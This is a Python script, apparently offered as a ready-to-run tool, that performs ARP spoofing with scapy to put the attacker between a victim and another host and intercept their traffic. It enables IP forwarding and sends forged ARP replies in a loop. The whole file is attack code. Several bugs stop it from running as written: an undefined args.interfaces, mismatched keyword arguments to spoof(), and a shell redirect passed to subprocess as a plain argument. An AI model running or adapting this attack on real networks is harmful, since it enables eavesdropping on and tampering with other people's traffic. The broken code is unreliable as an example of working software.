#!/usr/bin/env python3

import argparse
import subprocess
import sys
import scapy.all as scapy

class ArpSpoof:

    def _ip_forwarding(self, value):
        print("[*] Enabling IP Forwarding...")
        try:
            subprocess.run(["echo", value, ">", "/proc/sys/net/ipv4/ip_forward"])
        except Exception as e:
            print(f"[!] Error occured: {e}")

    def get_mac(self, ip):
        """Sends an ARP request to retrieve the MAC address of the specified IP"""

        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answer = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, interface, target_ip, host_ip):
        """Spoofs the target machine by pretending to be the spoof IP address."""
        
        t_mac = self.get_mac(ip=target_ip)
        packet = scapy.ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=t_mac)
        scapy.send(packet, iface=interface, verbose=False)

    def restore(self, interface, dest_ip, source_ip):
        """Restores the ARP table of the target to its original state."""

        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, psrc=source_ip, hwsrc=source_mac, pdst=dest_ip, hwdst=dest_mac)
        scapy.send(packet, iface=interface, verbose=False)
        print(f"[+] Restored {dest_ip} to it's original state.")

    def exploit(self, interface, target, spoof, interval):

        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            value = int(f.read(1))

        if 0 == value:
            print("[!] IP forwarding not enabled...")
            print("[+] Enabling IP forwarding...")
            self._ip_forwarding(value=1)

        s_c = 0

        if interval == 0:
            while True:
                try:
                    self.spoof(interface=interface, target=target, host_ip=spoof)
                    self.spoof(interface=interface, target=spoof, host_ip=target)
                    print(f"Sent: {s_c}", flush=True)
                    sys.stdout.flush()
                    s_c += 1

                except KeyboardInterrupt:
                    print("[+] Detected Ctrl + C... Restoring the arp table.")
                    self.restore(interface=interface, dest_ip=target_ip, source_ip=spoof_ip)
                    self.restore(interface=interface, dest_ip=spoof_ip, source_ip=target_ip)
                    print("[+] Disabling IP forwarding...")
                    self._ip_forwarding(value=0)

        elif interval > 0:
            for _ in range(interval):
                try:
                    print(f"Sent: {s_c}", flush=True)
                    sys.stdout.flush()
                    self.spoof(interface=interface, target=target_ip, spoof=spoof_ip)
                    self.spoof(interface=interface, target=spoof_ip, spoof=target_ip)
                    s_c += 1

                except KeyboardInterrupt:
                    print("[+] Detected Ctrl + C... Restoring the arp table.")
                    self.restore(interface=interface, dest_ip=target_ip, source_ip=spoof_ip)
                    self.restore(interface=interface, dest_ip=spoof_ip, source_ip=target_ip)
                    print("[+] Disabling IP forwarding...")
                    self._ip_forwarding(value=0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="Specify interface to use.", required=True)
    parser.add_argument("-t", "--target", help="Specify victim ip to spoof.", required=True)
    parser.add_argument("-s", "--spoof", help="Specify spoof ip to spoof.", required=True)
    parser.add_argument("-a", "--interval", default=0, type=int, help="Number of request(default: 0).")
    args = parser.parse_args()

    iface = args.interfaces
    target_ip = args.target
    spoof_ip = args.spoof
    interval = args.interval

    try:
        arp_spoofer = ArpSpoof()
        arp_spoofer.exploit(interface=iface, target=target_ip, spoof=spoof_ip, interval=interval)
    except PermissionError:
        print("[!] Root not detected...")
        print("[+] Run using root permission...")
